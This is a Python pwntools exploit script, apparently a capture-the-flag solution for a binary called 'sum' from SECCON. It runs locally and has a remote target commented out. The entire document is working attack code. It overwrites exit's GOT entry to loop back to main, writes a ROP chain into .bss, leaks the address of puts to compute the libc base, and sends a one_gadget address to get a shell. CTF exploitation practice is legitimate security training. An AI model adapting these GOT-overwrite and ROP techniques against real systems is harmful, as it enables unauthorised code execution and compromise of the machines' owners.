from pwn import *

libc = ELF('./libc.so.6')

def sum(value, target):
	r.sendline(str(value-4 - target) + ' 1 1 1 1 ' + str(target))

def last_sum(value, target, ra, rsp):
	r.sendline(str(value-2 - target-ra-rsp) + ' ' + str(ra) + ' ' + str(rsp) + ' 1 1 ' + str(target))	

def DEBUG():
	gdb.attach(r)

puts_got = 0x601018
puts_plt = 0x400600
exit_got = 0x601048
scanf_plt = 0x400650
main = 0x400903
ret = 0x4005ee

pop_rdi = 0x400a43
pop_rsi_r15 = 0x400a41
pop_rsp_r1345 = 0x400a3d
bss = 0x601880
lld = 0x400a68  # scanf("%lld", ...)

r = process('./sum')
#r = remote('sum.chal.seccon.jp', 10001)

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
r.recvuntil('0\n')
sum(main, exit_got)
sum(pop_rdi, bss+0x18)
sum(puts_got, bss+0x20)
sum(puts_plt, bss+0x28)
sum(pop_rdi, bss+0x30)
sum(lld, bss+0x38)
sum(pop_rsi_r15, bss+0x40)
sum(bss+0x68, bss+0x48)
sum(0, bss+0x50)
sum(ret, bss+0x58)
sum(scanf_plt, bss+0x60)

gdb.attach(r)
last_sum(pop_rsi_r15, exit_got, pop_rsp_r1345, bss)
puts_addr = u64(r.recvuntil('\x7f')[-6:] + '\x00'*2)
print "puts_addr @ ", hex(puts_addr)
libc_base = puts_addr - libc.symbols['puts']
print "libc_base @ ", hex(libc_base)
one_shot = libc_base + one_gadget[1]
print "one_shot @ ", hex(one_shot)
r.sendline(str(one_shot))

r.interactive()